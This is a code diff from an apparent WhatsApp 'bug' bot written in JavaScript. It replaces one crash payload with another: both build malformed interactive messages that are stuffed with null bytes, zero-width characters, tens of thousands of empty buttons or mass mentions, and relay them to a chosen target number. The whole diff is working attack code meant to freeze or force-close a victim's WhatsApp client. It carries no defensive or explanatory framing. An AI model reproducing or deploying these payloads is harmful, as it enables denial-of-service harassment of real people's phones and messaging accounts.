@@ -2631,86 +2631,60 @@ async function _epcihDiley(sock, target) {
 }
 
 // ── FcXDelay (neon-delay / neon-invasion) ──
-async function _fcXDelay(sock, target, mention = true) {
-  const bokepFc = JSON.stringify({ status: true, criador: 'ForceClose', resultado: { type: 'md', ws: { _events: { 'CB:ib,,dirty': ['Array'] }, _eventsCount: 800000, _maxListeners: 0, url: 'wss://web.whatsapp.com/ws/chat', config: { version: ['Array'], browser: ['Array'], waWebconnetUrl: 'wss://web.whatsapp.com/ws/chat', connCectTimeoutMs: 20000, keepAliveIntervalMs: 30000, logger: {}, printQRInTerminal: false, emitOwnEvents: true, defaultQueryTimeoutMs: 60000, customUploadHosts: [], retryRequestDelayMs: 250, maxMsgRetryCount: 5, fireInitQueries: true, auth: { Object: 'authData' }, markOnlineOnconnCect: true, syncFullHistory: true, linkPreviewImageThumbnailWidth: 192, transactionOpts: { Object: 'transactionOptsData' }, generateHighQualityLinkPreview: false, options: {}, appStateMacVerification: { Object: 'appStateMacData' }, mobile: true } } } });
-
-  const contextInfo = { mentionedJid: [target], isForwarded: true, forwardingScore: 999, businessMessageForwardInfo: { businessOwnerJid: target } };
-  const messagePayload = {
-    viewOnceMessage: {
-      message: {
-        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
-        interactiveMessage: {
-          contextInfo,
-          body: { text: '☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬' },
-          nativeFlowMessage: {
-            buttons: [
-              { name: 'single_select', buttonParamsJson: bokepFc + 'gatau' },
-              { name: 'call_permission_request', buttonParamsJson: bokepFc + '\u0003' },
-              { name: 'single_select', buttonParamsJson: bokepFc + 'gatau' },
-              { name: 'call_permission_request', buttonParamsJson: bokepFc + '\u0003' },
-            ]
-          }
-        }
-      }
-    }
-  };
-
-  await sock.relayMessage(target, messagePayload, { participant: { jid: target } });
-
-  if (mention) {
-    const msg = generateWAMessageFromContent(target, {
-      viewOnceMessage: {
-        message: {
-          videoMessage: {
-            url: 'https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true',
-            mimetype: 'video/mp4', fileSha256: '9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=',
-            fileLength: '999999', seconds: 999999, mediaKey: 'JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=',
-            caption: ' ', height: 999999, width: 999999,
-            fileEncSha256: 'HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=',
-            directPath: '/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0',
-            mediaKeyTimestamp: '1743742853',
-            contextInfo: { isSampled: true, mentionedJid: ['13135550002@s.whatsapp.net', ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)] },
-            streamingSidecar: 'Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=',
-            thumbnailDirectPath: '/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0',
-            thumbnailSha256: 'vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=',
-            thumbnailEncSha256: 'dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE='
-          }
-        }
-      }
-    }, {});
-
-    await sock.relayMessage('status@broadcast', msg.message, {
-      messageId: msg.key.id,
-      statusJidList: [target],
-      additionalNodes: [
-        {
-          tag: 'meta',
-          attrs: {},
-          content: [
-            {
-              tag: 'mentioned_users',
-              attrs: {},
-              content: [
-                { tag: 'to', attrs: { jid: target }, content: undefined }
-              ]
+async function scketch(sock, target) {
+      const msg1 = {
+        groupStatusMessageV2: {
+          message: {
+            interactiveMessage: {
+              body: { text: "  \u200E\0".repeat(10000) },
+              nativeFlowMessage: {
+                buttons: Array.from({ length: 0x4e21 }, () => ({})),
+                messageVersion: 1
+              }
             }
-          ]
+          }
         }
-      ]
-    });
+      };
 
-    await sock.relayMessage(target, {
-      groupStatusMentionMessage: {
-        message: {
-          protocolMessage: { key: msg.key, type: 25 }
+      const msg2 = {
+        viewOnceMessage: {
+          message: {
+            interactiveMessage: {
+              body: { text: "JUST END NOW" + "\u200B".repeat(10000) },
+              nativeFlowMessage: {
+                buttons: [
+                  {
+                    name: "order_status",
+                    buttonParamsJson: '{"order_id":"' + "\0".repeat(100000) +
+                                      '","order_title":"' + "\0".repeat(70000) +
+                                      '","status":"PROCESSING","token":"sgL4_dxscbfayun","flow_message_version":"1"}'
+                  },
+                  ...Array.from({ length: 0x4e22 }, () => ({}))
+                ],
+                messageVersion: 1
+              }
+            }
+          }
         }
-      }
-    }, {
-      additionalNodes: [
-        { tag: 'meta', attrs: { is_status_mention: 'true' }, content: undefined }
-      ]
-    });
-  }
+      };
+
+      const msg3 = {
+        viewOnceMessage: {
+          message: {
+            interactiveMessage: {
+              body: { text: "\r" },
+              nativeFlowMessage: {
+                buttons: Array.from({ length: 0xc350 * 2 }, () => ({})),
+                messageVersion: 1
+              }
+            }
+          }
+        }
+      };
+
+      await sock.relayMessage(target, msg1, {});
+      await sock.relayMessage(target, msg2, {});
+      await sock.relayMessage(target, msg3, {});
 }
 
 // ── DelaFreezCloseRelay (neon-delay wave 1) ──
